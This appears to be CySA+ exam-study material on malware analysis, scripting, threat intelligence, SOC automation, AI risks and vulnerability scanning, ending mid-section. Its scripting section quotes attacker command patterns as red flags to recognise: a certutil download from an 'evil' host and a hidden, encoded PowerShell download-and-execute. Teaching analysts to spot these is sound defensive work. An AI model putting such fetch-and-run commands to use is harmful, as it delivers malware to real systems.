To examine a suspicious file without executing it, analysts use Strings to pull readable text (URLs, IPs, commands) from a binary, VirusTotal to check it against dozens of AV engines and community data, and YARA rules to match characteristic byte/text patterns. To observe behavior, they detonate the sample in a sandbox — Cuckoo (open source) or Joe Sandbox — which runs it in isolation and reports the files, processes, registry keys, and network connections it touches. A caution with VirusTotal: uploading a sensitive internal file makes it visible to the broader community, and sophisticated malware checks whether it is running in a sandbox (timing, mouse movement, known artifacts) and stays dormant if so — so a clean sandbox report does not always mean a clean file.

ApproachTechniqueReveals
StaticStrings, hash lookup, YARAIndicators without running
DynamicSandbox detonationRuntime behavior, C2, drops
Static vs dynamic

Strings, VirusTotal hash lookups, and YARA are static analysis — examine without running. A sandbox is dynamic analysis — observe behavior while running. Use static first (safe, fast); escalate to dynamic when you need behavior.

Exam tip

"Isolate the infected host but keep it for forensics" → EDR host isolation. "Safely observe what the malware does" → sandbox detonation. "Pull URLs/IPs from a binary without running it" → Strings. "Standard format/transport for sharing indicators" → STIX/TAXII.

Scenario

Threat intel publishes a hash for new ransomware. Within minutes the analyst runs a retrospective EDR query across all endpoints, finds three hosts that executed the hash days earlier, and isolates them — converting one shared indicator into a fleet-wide containment action before the ransomware fully deploys.

title: Scripting, File Formats, Regex, and UEBA
html:
Analysts automate triage, parse evidence, and interpret what attackers ran. CS0-004 expects basic fluency with scripting constructs, the data formats logs arrive in, regular expressions, and the behavioral analytics that flag anomalous users. You will not be asked to author production code, but you must read a script or command line and explain its intent — a skill that separates an analyst who can triage independently from one who must escalate every artifact.

Scripting constructs

Across Python, PowerShell, and shell (Bash), the same building blocks recur: variables, conditionals, loops, functions, and string manipulation. You should be able to read a script and predict what it does — for example, a loop iterating over a list of IPs making a request to each. PowerShell deserves special attention because attackers favor it: -EncodedCommand (a Base64 blob), -nop -w hidden (no profile, hidden window), and IEX (New-Object Net.WebClient).DownloadString() together describe a fileless download-and-execute. Recognizing that pattern is a high-value skill. The PowerShell red flags worth memorizing:

  • -EncodedCommand / -enc — a Base64 blob hiding the real command.
  • -nop — skip the profile so defenses in it never load.
  • -w hidden — run with no visible window.
  • IEX (New-Object Net.WebClient).DownloadString() — fileless download-and-execute.
  • -ExecutionPolicy Bypass — ignore the script-execution restriction.

These constructs together describe fileless download-and-execute malware. The analyst's everyday automation use is more benign — parsing a thousand log lines, extracting all IPs from a capture, or bulk-querying reputation for a list of domains — and the same reading skill applies to both writing helpers and decoding attacker scripts.

File formats

Logs and configuration arrive in predictable formats. JSON uses key:value pairs and arrays and is ubiquitous in cloud and API logs. XML uses nested tags. YAML is indentation-based and common in IaC and pipeline configs. EVTX is the binary Windows Event Log format, read with Event Viewer or tools like EvtxECmd. Knowing the format tells you how to query it — JSON is naturally addressed by key path and is easy to filter with tools like jq, while CSV suits spreadsheet pivots and binary EVTX needs a dedicated parser before you can search it at scale.

FormatStructureWhere you see it
JSONkey:value, arraysCloud/API logs
XMLNested tagsSAML, legacy logs
YAMLIndentationIaC, CI/CD configs
CSVDelimited rowsExports, tabular data
EVTXBinaryWindows event logs

Regular expressions

Regex is the analyst's pattern-matching language for searching logs and writing detections. Core tokens: \d a digit, \w a word character, . any character, * zero-or-more, + one-or-more, ^/$ anchors, [ ] a character class, {n,m} a count range. A pattern like \d{1,3}(\.\d{1,3}){3} roughly matches an IPv4 address. Regex powers DLP rules, SIEM searches, and log parsing. A practical warning: greedy quantifiers and overly broad patterns can match far more than intended (or cause performance problems on large data sets), so analysts test regex against sample data before deploying it as a detection or a DLP block.

Regex tokenMatches
\dA single digit
\wWord character (letter/digit/_)
+ / *One-or-more / zero-or-more
^ / $Start / end anchor
[abc]Any one listed character

Interpreting suspicious commands and UEBA

Reading a captured command line and explaining its intent is a core skill — recognizing that certutil -urlcache -f http://evil/x.exe x.exe is a download, or that a long Base64 PowerShell string is obfuscation that decodes to a download-and-run. UEBA (User and Entity Behavior Analytics) builds per-user and per-device baselines and flags deviations — a user downloading 100x their normal data volume, or accessing systems they never touch. The conceptual contrast with signatures is essential: signatures catch known bad patterns, while UEBA catches unknown bad by detecting deviation from a learned normal, which is how it surfaces compromised-insider and account-takeover activity that no signature describes. For email triage, MXToolbox checks DNS, blacklist status, and mail-server configuration to validate sender legitimacy.

Common log-analysis workflows

Most analyst scripting in practice is glue: take a list of suspicious indicators and answer a question against the data. Typical workflows include extracting every unique source IP from a web log and counting hits per IP to spot a scanner, decoding a Base64 PowerShell argument to reveal the underlying command, parsing JSON cloud logs with jq to filter on a specific API call, or grepping a directory of logs for a known indicator across many files at once. The analyst who can chain a few command-line tools — or write a short Python loop — converts a tedious manual hunt through thousands of lines into a one-line answer, and recognizing these patterns is exactly the reading-comprehension skill the exam tests. Decoding obfuscation is a recurring sub-skill: attackers layer Base64, gzip, character substitution, and string concatenation specifically to defeat signatures, so peeling those layers back to the plaintext intent is daily analyst work.

Signature vs behavior

A signature describes a specific known-bad pattern and is blind to novel attacks. UEBA learns a baseline and flags deviation, catching unknown threats and insider abuse. Many questions hinge on this distinction — "detects deviation from normal" is always behavioral analytics, not a signature.

Exam tip

A PowerShell line with -enc/-EncodedCommand, hidden, and DownloadString is obfuscated fileless malware. UEBA detects deviation from a learned baseline, not signatures. Match the question's wording to the right concept.

Scenario

UEBA flags a sales rep who normally downloads a few MB a day suddenly pulling 40 GB from a file share at night. No signature matches — the activity is technically authorized — but the deviation from the user's baseline is the entire signal. The analyst investigates and finds an account-takeover staging data for exfiltration.

title: Threat Intelligence and Threat Hunting
html:
Objective 1.4 shifts from reacting to alerts toward proactively understanding adversaries and searching for them. This requires a vocabulary of threat actors, frameworks for describing their behavior, ways to measure and rank intelligence, and structured hunting and modeling techniques. The mindset change is fundamental: threat hunting assumes the adversary may already be inside and undetected, and goes looking for them with a hypothesis rather than waiting for a tool to alert.

Threat actors

Actors range from unsophisticated script kiddies and hacktivists to organized crime, nation-state APTs (Advanced Persistent Threats, well-resourced and patient), and insider threats (malicious or negligent staff with legitimate access). Each has characteristic motivations and capabilities, which shape the TTPs — tactics, techniques, and procedures — they employ. Knowing the likely actor narrows the expected behavior: a financially motivated ransomware crew behaves differently from a nation-state intent on quiet, long-term espionage, and a negligent insider differs again from a malicious one. Mapping the observed activity to a plausible actor profile guides where the analyst looks next.

MITRE ATT&CK and the Pyramid of Pain

MITRE ATT&CK is a knowledge base of real-world adversary tactics (the "why," e.g. Persistence, Lateral Movement) and techniques (the "how"), each with a stable ID. Analysts map detections to ATT&CK to find coverage gaps, often visualized as a heat map of the ATT&CK matrix. The Pyramid of Pain ranks indicator types by how much disrupting them hurts the adversary: hashes are trivial to change, while TTPs are the hardest — denying a behavior costs the attacker far more than blocking one hash. ATT&CK also underpins purple-team exercises, where the red team emulates specific techniques and the blue team verifies whether detections fire, producing a concrete, technique-by-technique measure of coverage.

Pyramid levelIndicatorPain to attacker
BottomHash valuesTrivial to change
LowerIP addressesEasy
MiddleDomain namesSimple
UpperNetwork/host artifacts, toolsAnnoying / challenging
TopTTPsTough — costly to change

IoC types, confidence, and collection

Indicators are atomic (cannot be broken down — an IP, a hash), computed (derived, such as a regex or a calculated value), or behavioral (a sequence of actions). Intelligence carries a confidence level reflecting source reliability and corroboration, often expressed with the Admiralty scale or as high/medium/low. Collection methods include OSINT (open sources), closed/proprietary feeds, and information-sharing communities such as ISACs. Intelligence is also commonly categorized by audience: strategic (high-level trends for leadership), operational (campaign and actor context), and tactical (specific IoCs and TTPs the SOC consumes directly) — matching the intelligence type to the consumer prevents drowning analysts in board-level trends or executives in raw IPs.

The intelligence cycle and hunting

Formal intelligence follows a cycle: planning and direction (what do we need to know), collection, processing, analysis, and dissemination, then feedback that refines the next round. Threat hunting applies this proactively at the host and network level: the analyst forms a hypothesis ("if an adversary used technique T1055 process injection, I would see X"), queries the data for that evidence, and either finds activity to escalate or refines detections to catch it next time. Hunting is hypothesis-driven and assumes breach — the absence of an alert is not evidence of absence. Two other frameworks recur in CySA+ vocabulary: the Cyber Kill Chain describes an intrusion as sequential stages (reconnaissance, weaponization, delivery, exploitation, installation, command-and-control, actions on objectives), useful for reasoning about how far an attacker has progressed and where to interrupt them; and the Diamond Model analyzes any event in terms of four linked features — adversary, capability, infrastructure, and victim — pivoting from one known feature to discover the others (a known C2 IP, for instance, may reveal additional victims sharing that infrastructure).

Intel cycle phaseQuestion answered
Planning & directionWhat do we need to know?
CollectionWhere does the data come from?
ProcessingHow is raw data made usable?
AnalysisWhat does it mean?
DisseminationWho needs it and in what form?

A hypothesis-driven hunt that assumes breach proceeds in steps:

  1. Form a hypothesis tied to a technique ("if T1055 process injection occurred, I would see X").
  2. Identify the data source that would hold that evidence.
  3. Query the data for the predicted artifacts.
  4. Escalate any findings, or refine a detection so it fires automatically next time.

Threat modeling, mapping, and deception

STRIDE categorizes threats as Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege — a structured way to enumerate what could go wrong in a design. Threat mapping ties observed activity to known actors and campaigns. Cyber deception — honeypots, honeytokens, decoy credentials — plants tripwires that legitimate users never touch, so any interaction is a high-fidelity alert. A honeytoken (a fake credential, a decoy document, a planted API key) is especially efficient: it requires no baseline and produces near-zero false positives because there is no legitimate reason for anyone to ever touch it.

Strategic, operational, tactical

Strategic intel is high-level trends for decision-makers; operational intel is campaign/actor context; tactical intel is the concrete IoCs and TTPs the SOC operationalizes. Match the intel type to its audience.

Exam tip

Blocking a hash or IP sits at the bottom of the Pyramid of Pain (easy for the attacker to change); denying a TTP is at the top (most painful). "Decoy that no legitimate user should touch" = honeypot/honeytoken. "Spoofing/Tampering/Repudiation..." = STRIDE.

Scenario

A SOC maps its detections onto the ATT&CK matrix and finds it has strong coverage of initial access but a blind spot in lateral movement. A hunt is launched with the hypothesis that an attacker would use SMB and remote-service techniques, and the gap is closed with new Zeek and Sysmon detections — proactively, before an alert ever fired.

title: Efficiency, Process Improvement, and AI in Security Operations
html:
The final objectives of Domain 1 address how a SOC scales: standardizing and automating work, integrating tools, tuning detections, and — newest to the exam — managing the risks and opportunities of artificial intelligence in security operations. The throughline is that a SOC cannot scale by hiring analysts linearly with alert volume; it scales by standardizing decisions, automating the repetitive parts, and reserving human judgment for what genuinely needs it.

Standardized processes, playbooks, and runbooks

Consistency is the enemy of attacker advantage. A standardized process ensures every analyst handles the same alert the same way. A playbook defines the decision logic for a scenario ("on phishing report, do X, then Y"), while a runbook gives the detailed operational steps to execute. Together they reduce dwell time, training burden, and human error. They also make outcomes auditable and repeatable — a new analyst following the phishing playbook reaches the same containment decision as a veteran, and the organization can measure and improve the process rather than depending on tribal knowledge that walks out the door when someone leaves.

SOAR, IaC, and automation

SOAR (Security Orchestration, Automation, and Response) executes playbooks automatically — enriching an alert with threat intel, isolating a host, or opening a ticket without human delay — freeing analysts for judgment work. Infrastructure as Code defines systems in version-controlled files (Terraform, Ansible) so environments are consistent, auditable, and quickly rebuilt. Data enrichment attaches context (GeoIP, asset owner, reputation) to events so triage is faster. A practical design principle is to automate the deterministic, high-confidence steps (enrich, deduplicate, gather context, block a known-bad indicator) while keeping a human in the loop for irreversible or high-impact actions (wiping a host, disabling an executive's account) — full automation of destructive actions risks an attacker or a faulty rule triggering self-inflicted disruption.

The dividing line between what to automate fully and what to gate behind a human:

  • Safe to automate — enrich an alert, deduplicate, gather context, block a known-bad indicator, open a ticket.
  • Keep a human in the loop — wiping a host, disabling an executive's account, any irreversible or high-impact action.
  • Rule of thumb — automate the deterministic and reversible; reserve judgment for the destructive.

Tuning, dashboards, and integration

Detections require continuous rule and alert tuning to suppress false positives without losing true detections — an unmanaged rule set buries analysts in noise and causes alert fatigue, the condition where real alerts are missed because analysts are numb to a flood of false ones. Dashboards surface KPIs and active incidents at a glance. Tools integrate through APIs, webhooks (event-driven callbacks), and plug-ins, letting the SIEM, SOAR, EDR, and ticketing system act as one workflow. Metrics like mean time to detect (MTTD) and mean time to respond (MTTR) quantify whether process improvements are actually working. A common tuning trap is the false dichotomy between suppressing an alert and keeping it noisy: the better answer is often to enrich the alert with context (asset criticality, user role, threat-intel reputation) so it can be auto-prioritized or auto-closed rather than dropped entirely, preserving the detection while removing the noise. Risk-based alerting — scoring each event and surfacing only those that cross a threshold — is the modern alternative to a flat firehose of equal-weight alerts, and it directly addresses the analyst-fatigue problem that causes real detections to be missed.

CapabilityWhat it provides
Playbook / runbookConsistent, repeatable response
SOARAutomated playbook execution
IaCVersioned, auditable infrastructure
API / webhook / plug-inTool-to-tool integration
Rule tuningFewer false positives, less fatigue

AI in security operations: use cases and risks

AI accelerates the SOC — summarizing alerts, drafting detections, triaging at scale, and surfacing anomalies. But it introduces distinct risks. Hallucinations are confident but false outputs that can mislead an investigation. Data exposure occurs when sensitive incident data is pasted into a public model and leaves the organization's control. Model poisoning corrupts training data so the model learns attacker-favorable behavior. Malicious prompts (prompt injection) manipulate an AI agent into ignoring its instructions or leaking data. Attackers also weaponize AI offensively — generating more convincing phishing, producing polymorphic malware variants, and creating deepfakes for social engineering — so AI is a double-edged factor the analyst must reason about from both sides.

AI riskDescription
HallucinationConfident but false output
Data exposureSensitive data sent to public model
Model poisoningCorrupted training data
Prompt injectionCrafted input subverts instructions

AI governance

Because of these risks, organizations need AI governance: acceptable-use policies for AI tools, data-handling rules that forbid feeding sensitive data to unsanctioned models, human review of AI-generated conclusions, and validation of any AI used in detection. Governance treats AI output as advisory, not authoritative, until verified. The practical posture for a SOC is to provide a sanctioned, private model with appropriate data controls so analysts get the productivity benefit without resorting to public tools — pairing enablement with a clear policy is more effective than a blanket ban that drives shadow usage underground.

Scenario

An analyst pastes full incident logs containing customer PII into a public chatbot to summarize them. This is a data exposure event — the data has left organizational control. The governance fix is an AI usage policy and a sanctioned, private model with data controls so the analyst keeps the productivity gain without the leak.

Exam tip

Map AI risks precisely: confident-but-wrong output = hallucination; secrets sent to a public model = data exposure; tampered training data = model poisoning; tricking the model via crafted input = prompt injection / malicious prompt.

title: Asset Inventory and Scan Planning
html:
Vulnerability management begins with a truth that the exam returns to repeatedly: you cannot protect what you do not know you have. A complete, current asset inventory is the foundation of every downstream decision — what to scan, how often, with what intensity, and how aggressively to remediate. An inventory that misses systems guarantees blind spots, and a vulnerability scanner only reports on the hosts it is pointed at. For the analyst, the inventory is not a static spreadsheet but a living data set that feeds scope, prioritization, and reporting, continuously reconciled against discovery scans, DHCP leases, cloud provider APIs, CMDB records, and endpoint agents so that newly provisioned, decommissioned, and shadow-IT assets are reflected within hours rather than quarters.

What the Inventory Must Capture

A useful asset record goes well beyond an IP address. It identifies the host, its owner, its function, the data it stores, and its exposure. CySA+ frames assets broadly: physical servers and endpoints, virtual machines, containers, cloud instances, network appliances, IoT/OT devices, mobile devices, and the applications and data sets riding on top of them. Each asset is tagged with a sensitivity level (or data classification) so that a scanner finding on a card-processing database is weighted differently from the same finding on a lab sandbox. Mature inventories also record lifecycle state (build, production, end-of-life), patch group membership, and the maintenance window in which the asset can tolerate disruption — metadata the scanner orchestration layer reads directly when it assembles a scan job.

Inventory attributeWhy the analyst needs it
Owner / business unitRoutes remediation to the right team
Function / criticalityDrives prioritization and asset value
Data classification / sensitivitySets scan intensity and regulatory scope
Network segment / zoneDetermines internal vs external scanning
OS / software stackMaps which CVEs even apply
Lifecycle state / EOL dateFlags unsupported systems needing compensating controls
Maintenance windowDictates when an aggressive scan may safely run

Planning Levers

Scan planning balances coverage against operational risk. The analyst tunes several interacting variables:

  • Scheduling: when scans run. High-impact scans against production are often windowed to off-hours; continuous or daily scans suit externally exposed assets.
  • Operations / performance: an aggressive scan can saturate links, exhaust connection tables, or crash fragile devices (legacy printers, SCADA controllers). Throttling thread counts and bandwidth keeps the scan from becoming its own denial-of-service.
  • Sensitivity levels: more sensitive systems justify deeper, credentialed scans and faster remediation clocks.
  • Segmentation: network boundaries dictate where a scanner must be placed. A scanner inside a segmented PCI zone sees what an outside engine cannot.
  • Regulatory requirements: frameworks impose minimum cadence and method — for example, quarterly external scans by an approved vendor.
Scope is a negotiation between security coverage and business tolerance for disruption. The analyst's job is to make that trade-off explicit and documented, not accidental.
Planning leverTighten when…Relax when…
Scan schedulingTarget is fragile or production-critical — window to off-hoursAsset is externally exposed — scan continuously
Scan intensity / throttlingLegacy or OT devices on the segmentHardened, resilient servers
Scan depth (credentialed)High sensitivity level assetsDisposable lab or sandbox hosts
CadenceRegulatory mandate sets a minimumLow-value, rarely-changing systems

Continuous Versus Scheduled Assessment

Legacy programs ran a monthly or quarterly scan and treated the report as a point-in-time snapshot. Modern programs increasingly shift toward continuous monitoring, where agents and passive sensors report state in near real time, in contrast to scheduled scanning that runs on a fixed cadence and the inventory is reconciled constantly. The trade-off is operational: continuous assessment surfaces a newly exploitable host the day it appears, but it also produces a steadier firehose of findings that must be triaged and risks alert fatigue if prioritization is weak. Scheduled scanning is easier to window around production constraints and to align with compliance evidence cycles, but it leaves coverage gaps between runs — a host stood up the day after a quarterly scan may sit unassessed for ninety days. The analyst chooses a blend: continuous agent telemetry on roaming and high-value assets, scheduled credentialed sweeps for the data center, and on-demand scans triggered by change-management events such as a new deployment or an emergency patch. The choice of cadence is itself a documented planning decision, not a default left to the tool.

Why Segmentation Matters to Scanning
Because firewalls and ACLs filter scan traffic, a single externally placed scanner will under-report on internal segments — it sees only what the perimeter permits. Mature programs deploy multiple scan engines (or distributed sensors) so each network zone is assessed from inside its own boundary, then aggregate the results centrally.
Exam Tip
If a scenario says a scan crashed a production device or saturated the network, the fix is a planning/performance adjustment (throttling, scheduling, scope), not abandoning scanning. If it says findings were missed on an internal subnet, suspect scanner placement and segmentation, not scanner choice. "Quarterly scan by an approved scanning vendor" is a regulatory driver — flag the compliance requirement.
Scenario
An analyst kicks off a full-intensity scan at 10 a.m. and the warehouse barcode-label printers all freeze, halting shipping. The root cause is a performance/operations planning failure: fragile devices were scanned aggressively during business hours. The corrective actions are scheduling the scan in a maintenance window, throttling the engine, and tagging the printers' sensitivity so they receive a gentler scan profile — none of which require dropping vulnerability scanning altogether. Going forward, the analyst marks the printer subnet with a low-intensity scan policy and a defined maintenance window in the inventory so the orchestration layer never again hits those fragile devices at full speed during business hours.

title: Vulnerability Scan Types
html:
Not all scans are created equal. CySA+ expects you to choose the right scan type for the asset, the network position, and the depth of insight required — and to know the trade-offs each choice imposes on accuracy, stealth, and operational impact. Four axes define the choices: vantage point (internal vs external), data collection method (agent vs agentless), authentication (credentialed vs non-credentialed), and interaction model (passive vs active). These axes are independent, so a single scan job is described by a point on each — for example, an internal, agentless, credentialed, active scan — and the analyst's skill is in selecting the combination that maximizes accuracy for the asset class while staying within its operational and regulatory constraints.

Vantage and Collection

  • Internal scan: runs from inside the network and sees hosts as a trusted insider (or a breached attacker who is already in) would — far more services, deeper findings.
  • External scan: runs from the public internet against the perimeter, showing exactly what an outside attacker can reach. Regulatory mandates (e.g., quarterly external scans) usually target this view.
  • Agent-based: a lightweight agent installed on the host collects data locally and reports back. Excellent for mobile/remote and ephemeral assets that are rarely on the network when a central scan runs; no open ports needed.
  • Agentless: a central scanner reaches across the network to each host. No software to deploy, but it depends on network reachability and credentials.
VantageAttacker it simulatesTypical driver
Internal scanTrusted insider or post-breach attackerDeep assessment of east-west exposure
External scanAnonymous internet attacker at the perimeterCompliance mandate (e.g., quarterly external scan)

Authentication and Interaction

Scan typeStrengthWeakness
CredentialedReads installed patches/config from inside — accurate, fewer false positivesRequires managing privileged scan accounts
Non-credentialedMimics an unauthenticated attacker's viewMore guessing → more false positives
PassiveObserves traffic only — zero impact, won't crash hostsOnly sees what talks on the wire; incomplete
ActiveProbes hosts directly — thoroughCan disrupt fragile devices; noisy

Choosing the Right Combination

These axes combine. A credentialed, agent-based internal scan gives the deepest, most accurate picture of patch state and configuration. A non-credentialed external active scan best simulates an opportunistic attacker. Passive monitoring shines where active probing is forbidden — sensitive OT environments, for instance, where a single aggressive probe can knock a controller offline. The analyst also weighs how the scan engine itself reaches the target: an agentless internal scan needs a scan account with enough privilege to read the registry or query installed packages, plus firewall rules permitting the engine to reach management ports, whereas an agent sidesteps both by collecting locally and phoning home over an outbound channel.

Agent Versus Agentless in Practice

ConsiderationAgent-basedAgentless
Coverage of roaming hostsStrong — reports whenever onlineWeak — must be on-network during the scan
Deployment effortMust install and maintain agentsNone — central engine only
Network/firewall dependencyMinimal; outbound check-inHigh; needs reachability and credentials
Host resource impactSmall constant local footprintNone on host; load is on the network
Best fitLaptops, remote workers, ephemeral cloudStable data-center subnets, appliances

In a typical enterprise the two are complementary: agents cover the unpredictable population of laptops and short-lived cloud instances that are rarely present for a scheduled sweep, while agentless scanning covers network appliances, hypervisors, and embedded devices that cannot host an agent at all. Relying on only one method guarantees blind spots — agentless misses the laptop that was off the VPN at scan time, and agent-based misses the printer that will never run an agent.

Managing Scan Credentials Safely

Credentialed scanning is the single biggest lever for accuracy, but the privileged accounts it requires are themselves a risk that the analyst must manage. A scan account typically holds local administrator or root-equivalent rights across a large swath of hosts, so if its credentials leak, an attacker inherits enterprise-wide reach. Mature programs reduce that exposure by storing the credentials in a vault or privileged-access-management system, rotating them frequently, scoping each account to only the hosts it must reach, restricting the source IPs from which it may authenticate, and monitoring its use so that any login outside a scan window raises an alert. The analyst also confirms the account has exactly the rights the scanner needs — read access to the registry, package database, and configuration files — rather than blanket domain-admin, applying least privilege to the scanning function itself. Done well, credentialed scanning delivers low-false-positive results without becoming the soft target that compromises the whole estate.

Credentialed vs Non-Credentialed Accuracy
Credentialed scans authenticate to the host and inspect the registry, installed packages, and configuration files directly, so they confirm whether a patch is actually present rather than inferring it from a banner. This dramatically reduces false positives — which is why mature programs prefer credentialed scanning wherever the privileged accounts can be safely managed.
Exam Tip
Most accurate / fewest false positives = credentialed. Best for ephemeral, roaming, or rarely-connected hosts = agent-based. Cannot disrupt fragile OT/medical devices = passive. Simulates the outside attacker / satisfies compliance mandates = external. Match the keyword in the stem to one of these four axes.
Scenario
A hospital needs to assess networked infusion pumps that lock up if probed. An active credentialed scan is unacceptable because it risks patient safety. The analyst chooses passive monitoring to fingerprint the devices from observed traffic, supplemented by vendor advisories, accepting that the picture is less complete in exchange for zero operational risk to life-critical equipment. For the hospital's roaming clinical laptops, by contrast, the analyst deploys agent-based scanning so those machines are assessed even when they are off the network during the nightly sweep.

title: Discovery and Security Baseline Scanning
html:
Before a vulnerability scanner can assess a host, something has to find the host and learn what it is. Discovery scanning answers "what is alive on this network?" while baseline scanning answers "does this host match the configuration we mandated?" The two are distinct phases with distinct goals, and the exam tests whether you can tell a discovery/mapping activity from a compliance/baseline activity. Confusing the two leads to the wrong corrective action: a discovery gap is fixed by widening scope or adding a sensor, while a baseline gap is fixed by re-hardening a host against its standard.

Discovery, Mapping, and Fingerprinting

  • Discovery scan: sweeps a range with lightweight probes (ICMP, ARP, TCP SYN to common ports) to enumerate live hosts. It populates and reconciles the asset inventory.
  • Mapping scan: builds a picture of topology and reachability — which hosts, which open ports, which segments connect.
  • Device fingerprinting: infers OS, version, and service from response characteristics (TCP/IP stack quirks, banners, TTL values). Fingerprinting tells the scanner which vulnerability checks even apply, avoiding wasted probes and reducing false positives.
ProbeWhat it revealsCost
ICMP echoHost is alive and reachableNegligible
ARP requestLive hosts on the local segmentNegligible
TCP SYN to common portWhether a service is listeningLow
Banner / stack analysisOS family, version, and daemonModerate (analytical step)

Discovery probes are deliberately cheap. An ICMP echo or a SYN to port 443 costs almost nothing and reveals whether something answers, which is why an internet-scale tool can sweep millions of addresses quickly. Fingerprinting is the analytical step that follows: by comparing subtle differences in how a stack sets TCP window sizes, options ordering, and TTLs, the scanner narrows the OS to a family and version, and by reading service banners it identifies the daemon and release behind an open port. That identity is what lets the scanner apply only the relevant CVE checks rather than firing every plugin at every host.

Baseline and Configuration Scanning

A security baseline is the documented, approved secure configuration for a class of systems. Baseline scanning compares a live host against that standard and reports drift — an open service that should be disabled, a weak cipher, a missing audit-log setting. This is configuration/compliance assessment, separate from CVE-based vulnerability detection, though scanners perform both. The machine-readable expression of many baselines is SCAP (Security Content Automation Protocol), which packages checklists in standardized formats so any compliant scanner can evaluate a host against, say, a CIS or DISA STIG profile and emit a consistent pass/fail per rule.

FrameworkBaseline roleTypical scope
PCI DSSMandated controls + quarterly scans for cardholder data environmentsPayment-card systems
CIS BenchmarksPrescriptive, OS/app-specific hardening checklistsServers, endpoints, cloud, devices
ISO 27000 seriesRisk-based ISMS framework; sets policy and control expectationsWhole organization (governance)
DISA STIGDetailed government hardening standard, often delivered as SCAP contentDefense and regulated systems
Discovery finds the asset; fingerprinting identifies it; baseline scanning judges whether its configuration is acceptable. Vulnerability scanning then layers known-CVE checks on top.

How the Phases Chain Together

PhaseQuestion answeredTypical output
DiscoveryWhat hosts are alive?Reconciled inventory of live IPs
Mapping / fingerprintingWhat is each host and what does it run?OS, services, open ports per host
Baseline / configurationDoes it match the approved standard?Drift report against CIS/STIG
VulnerabilityWhat known CVEs apply?Severity-rated findings list

Run in sequence, these phases reinforce one another: discovery reconciles the inventory, fingerprinting scopes which checks apply, baseline scanning catches misconfigurations the CVE database will never list, and the vulnerability scan layers known-flaw detection on top. A program that skips the baseline phase often spends weeks chasing CVEs while a weak-cipher or excessive-permission misconfiguration — not tied to any CVE — quietly remains the easiest path in.

Why Misconfiguration Is Not a CVE

A point the exam probes is that baseline drift and CVE vulnerabilities are different categories of finding requiring different remediation. A CVE is a flaw in code — a buffer overflow, an injection bug — that the vendor fixes with a patch, and the vulnerability scanner detects it by version or by a safe probe. A misconfiguration is a setting the organization itself chose or allowed to drift: TLS 1.0 left enabled, an anonymous share, a default credential never changed, an overly broad file permission, logging switched off. No patch fixes a misconfiguration; the remediation is to change the setting back to the approved baseline and to enforce that baseline so it does not drift again. Because misconfigurations rarely carry a CVSS score in a feed, they are easy to overlook in a CVE-centric program, yet they are frequently the actual entry point in real breaches. Baseline scanning against a SCAP-encoded CIS or STIG profile is precisely the control that surfaces them, which is why a complete program treats configuration compliance and vulnerability detection as parallel, equally important streams of work.

CIS Benchmarks vs PCI DSS vs ISO 27000
Keep the three straight: CIS Benchmarks are granular, technical hardening guides ("set this registry key, disable this service") often used as the literal baseline a scanner checks against. PCI DSS is a contractual industry standard for payment-card data with explicit scanning cadence. ISO 27000 is a high-level, risk-based management-system framework — it tells you to have baselines and a vulnerability program, not which registry keys to set.
Exam Tip
"Compare a host to its approved secure configuration" = baseline/configuration scan, not a vulnerability scan. "Enumerate live hosts on an unknown subnet" = discovery scan. "Determine the OS and version from response behavior" = fingerprinting. When a question pairs payment-card systems with a quarterly external requirement, the driver is PCI DSS. Machine-readable baseline content delivered for automated checking = SCAP.
Scenario
An auditor asks the analyst to prove that all web servers disable TLS 1.0 and enforce the organization's logging settings. This is a baseline scan against the CIS Benchmark profile for web servers — not a CVE hunt. The analyst runs a configuration-compliance scan using SCAP content, reports each server's drift from the benchmark, and feeds the deviations to the server owners for remediation, providing the auditor a documented compliance posture rather than a list of patches.

title: Network Scanning and Multipurpose Tools
html:
The exam names specific tools and expects you to know what each is best at. This section covers the network-discovery and reconnaissance/exploitation multitools. Confusing a host-discovery scanner with an exploitation framework is a classic trap, so anchor each tool to its primary purpose. The mental model is a pipeline: broad, fast tools find what is reachable; precise tools enumerate it in detail; OSINT tools learn about it without touching it; and exploitation frameworks prove whether a finding is genuinely weaponizable.

Host and Port Discovery

ToolPrimary purposeNote
Angry IP ScannerFast, simple ping/port sweep across IP rangesLightweight, GUI, quick inventory
MasscanInternet-scale port scanning at extreme speedAsynchronous; can scan the whole IPv4 space fast
Nmap / ZenmapDetailed host discovery, port/service/version detection, OS fingerprinting, NSE scriptsZenmap is the GUI front end for Nmap

Nmap is the analyst's Swiss-army knife: -sS SYN scan, -sV service/version detection, -O OS detection, and the Nmap Scripting Engine (NSE) for vulnerability and discovery scripts. Masscan trades Nmap's depth for raw speed — analysts often run Masscan to find open ports across a huge range, then hand those targets to Nmap for detailed enumeration. The reason Masscan is so fast is architectural: it uses an asynchronous, stateless transmission model that fires SYN packets as fast as the link allows and matches replies by encoding state in the packet itself, rather than maintaining a connection table per target the way a stateful scanner does.

Reading Nmap Output

An analyst must interpret what a scan returns, not just launch it. Nmap reports each probed port in one of several states — open (a service is listening and accepted the probe), closed (the host answered but nothing is listening), and filtered (no response, typically because a firewall silently dropped the packet).

Port stateWhat Nmap sawLikely meaning
OpenProbe accepted by a listening serviceLive service — map to CVE checks
ClosedHost replied but no service listeningReachable host, port not in use
FilteredNo reply — packet droppedFirewall/ACL is doing its job (or rate-limiting)

Distinguishing closed from filtered matters operationally: a filtered result tells you a control is doing its job, while a flood of filtered ports across a range can also mean the scan is being rate-limited or blocked, skewing results. Service/version detection (-sV) reads the banner or fingerprint to name the daemon and release, which then feeds CVE mapping. Aggressive timing templates (-T4, -T5) speed scans but raise the chance of triggering IPS responses or overwhelming fragile hosts.

Reconnaissance and Exploitation Frameworks

  • Metasploit (MSF): a full exploitation framework — modules to exploit known vulnerabilities, deliver payloads (Meterpreter), and validate that a finding is genuinely exploitable. Used in penetration testing and to confirm whether a scanner finding is a real, weaponizable risk.
  • Maltego: an OSINT and link-analysis tool that graphs relationships between people, domains, IPs, and infrastructure — passive reconnaissance and footprinting.
  • Recon-ng: a modular, web-reconnaissance framework (similar workflow to Metasploit) for gathering OSINT such as subdomains, hosts, and contacts.
CategoryToolsQuestion answered
Discovery / port scanAngry IP, Masscan, NmapWhat is reachable and listening?
ExploitationMetasploitCan this vuln actually be exploited?
OSINT / footprintingMaltego, Recon-ngWhat can I learn without touching the target?

Active Versus Passive Reconnaissance

